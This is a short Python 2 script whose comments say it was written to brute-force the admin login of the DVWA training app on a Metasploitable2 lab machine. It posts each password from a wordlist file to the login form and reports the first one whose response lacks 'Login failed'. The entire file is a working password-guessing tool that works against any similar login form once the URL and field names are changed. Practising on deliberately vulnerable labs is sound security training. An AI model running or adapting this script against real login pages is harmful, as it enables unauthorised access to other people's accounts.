#!/usr/bin/python2.7
# bruteforce login form password with list of password by checking the response content
# if the response content has "Login failed" the password is incorrect, if it not passed value is the password
# Used DVWA Vulnerable Web App - Metasploitable2 virtualbox

import requests

target_url = "http://192.168.44.101/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("password.lst", "r") as wordlist_file:
    i = 1
    for line in wordlist_file:
        print(i)
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        i = i + 1
        if "Login failed" not in response.content:
            print("[+] Got the Password ----> " + word)
            exit()

print("[+] Reached end of line ")
